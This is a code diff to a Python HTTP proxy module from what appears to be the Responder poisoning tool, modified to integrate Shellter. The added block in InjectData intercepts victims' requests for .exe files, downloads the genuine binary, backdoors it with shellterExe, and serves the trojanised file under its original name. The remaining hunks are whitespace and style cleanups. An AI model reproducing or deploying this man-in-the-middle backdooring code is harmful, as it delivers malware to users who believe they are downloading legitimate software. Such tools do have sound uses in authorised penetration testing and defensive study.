@@ -14,13 +14,18 @@
 #
 # You should have received a copy of the GNU General Public License
 # along with this program.  If not, see <http://www.gnu.org/licenses/>.
+#
+# Modified by Dale Ruane - DemmSec
+#
 import os
 import settings
 import urlparse
 import select
 import zlib
 import BaseHTTPServer
+import hashlib
 
+from shellter.shellter import *
 from servers.HTTP import RespondWithFile
 from utils import *
 
@@ -29,12 +34,29 @@ IgnoredDomains = [ 'crl.comodoca.com', 'crl.usertrust.com', 'ocsp.comodoca.com',
 def InjectData(data, client, req_uri):
 
 	# Serve the .exe if needed
-	if settings.Config.Serve_Always:
+	if settings.Config.Serve_Always == True:
 		return RespondWithFile(client, settings.Config.Exe_Filename, settings.Config.Exe_DlName)
 
 	# Serve the .exe if needed and client requested a .exe
 	if settings.Config.Serve_Exe == True and req_uri.endswith('.exe'):
 		return RespondWithFile(client, settings.Config.Exe_Filename, os.path.basename(req_uri))
+	# Serve backdoored exe
+	if settings.Config.Shellter == True and req_uri.endswith('.exe'):
+		try:
+			localfilepath = downloadExe(req_uri)
+			filehash = hashlib.md5(open(localfilepath, 'rb').read()).hexdigest()
+			status = SaveFileToDb(filehash, localfilepath)
+			if status == 0:
+				try:
+					shellterExe(localfilepath)
+				except:
+					print text("[Shellter] Could not backdoor exe")
+			else:
+				localfilepath = status[2]
+		except:
+			print text("[Shellter] Cannot download file")
+
+		return RespondWithFile(client, localfilepath, os.path.basename(req_uri))
 
 	if len(data.split('\r\n\r\n')) > 1:
 		try:
@@ -53,7 +75,7 @@ def InjectData(data, client, req_uri):
 		if "content-type: text/html" in Headers.lower():
 
 			# Serve the custom HTML if needed
-			if settings.Config.Serve_Html:
+			if settings.Config.Serve_Html == True:
 				return RespondWithFile(client, settings.Config.Html_Filename)
 
 			Len = ''.join(re.findall('(?<=Content-Length: )[^\r\n]*', Headers))
@@ -79,7 +101,7 @@ def InjectData(data, client, req_uri):
 	return data
 
 class ProxySock:
-	def __init__(self, socket, proxy_host, proxy_port) : 
+	def __init__(self, socket, proxy_host, proxy_port) :
 
 		# First, use the socket, without any change
 		self.socket = socket
@@ -97,18 +119,18 @@ class ProxySock:
 
 		# Store the real remote adress
 		(self.host, self.port) = address
-	   
-		# Try to connect to the proxy 
+
+		# Try to connect to the proxy
 		for (family, socktype, proto, canonname, sockaddr) in socket.getaddrinfo(
-			self.proxy_host, 
+			self.proxy_host,
 			self.proxy_port,
 			0, 0, socket.SOL_TCP) :
 			try:
-				
+
 				# Replace the socket by a connection to the proxy
 				self.socket = socket.socket(family, socktype, proto)
 				self.socket.connect(sockaddr)
-					
+
 			except socket.error, msg:
 				if self.socket:
 					self.socket.close()
@@ -116,19 +138,19 @@ class ProxySock:
 				continue
 			break
 		if not self.socket :
-			raise socket.error, ms 
-		
+			raise socket.error, ms
+
 		# Ask him to create a tunnel connection to the target host/port
 		self.socket.send(
-				("CONNECT %s:%d HTTP/1.1\r\n" + 
-				"Host: %s:%d\r\n\r\n") % (self.host, self.port, self.host, self.port))
+				("CONNECT %s:%d HTTP/1.1\r\n" +
+				"Host: %s:%d\r\n\r\n") % (self.host, self.port, self.host, self.port));
 
 		# Get the response
 		resp = self.socket.recv(4096)
 
 		# Parse the response
 		parts = resp.split()
-		
+
 		# Not 200 ?
 		if parts[1] != "200":
 			print color("[!] Error response from upstream proxy: %s" % resp, 1)
@@ -140,65 +162,65 @@ class ProxySock:
 
 	def bind(self, *args) :
 		return self.socket.bind(*args)
-	
+
 	def close(self) :
 		return self.socket.close()
-	
+
 	def fileno(self) :
 		return self.socket.fileno()
 
 	def getsockname(self) :
 		return self.socket.getsockname()
-	
+
 	def getsockopt(self, *args) :
 		return self.socket.getsockopt(*args)
-	
+
 	def listen(self, *args) :
 		return self.socket.listen(*args)
-	
+
 	def makefile(self, *args) :
 		return self.socket.makefile(*args)
-	
+
 	def recv(self, *args) :
 		return self.socket.recv(*args)
-	
+
 	def recvfrom(self, *args) :
 		return self.socket.recvfrom(*args)
 
 	def recvfrom_into(self, *args) :
 		return self.socket.recvfrom_into(*args)
-	
+
 	def recv_into(self, *args) :
 		return self.socket.recv_into(buffer, *args)
-	
+
 	def send(self, *args) :
 		try: return self.socket.send(*args)
 		except: pass
-	
+
 	def sendall(self, *args) :
 		return self.socket.sendall(*args)
-	
+
 	def sendto(self, *args) :
 		return self.socket.sendto(*args)
-	
+
 	def setblocking(self, *args) :
 		return self.socket.setblocking(*args)
-	
+
 	def settimeout(self, *args) :
 		return self.socket.settimeout(*args)
-	
+
 	def gettimeout(self) :
 		return self.socket.gettimeout()
-	
+
 	def setsockopt(self, *args):
 		return self.socket.setsockopt(*args)
-	
+
 	def shutdown(self, *args):
 		return self.socket.shutdown(*args)
 
 	# Return the (host, port) of the actual target, not the proxy gateway
 	def getpeername(self) :
-		return self.host, self.port
+		return (self.host, self.port)
 
 # Inspired from Tiny HTTP proxy, original work: SUZUKI Hisao.
 class HTTP_Proxy(BaseHTTPServer.BaseHTTPRequestHandler):
@@ -268,7 +290,7 @@ class HTTP_Proxy(BaseHTTPServer.BaseHTTPRequestHandler):
 			#self.send_error(200, "OK")
 			return
 
-		if scm not in 'http' or fragment or not netloc:
+		if scm not in ('http') or fragment or not netloc:
 			self.send_error(400, "bad url %s" % self.path)
 			return
 
@@ -294,7 +316,7 @@ class HTTP_Proxy(BaseHTTPServer.BaseHTTPRequestHandler):
 				del self.headers['Proxy-Connection']
 				del self.headers['If-Range']
 				del self.headers['Range']
-				
+
 				for k, v in self.headers.items():
 					soc.send("%s: %s\r\n" % (k.title(), v))
 				soc.send("\r\n")
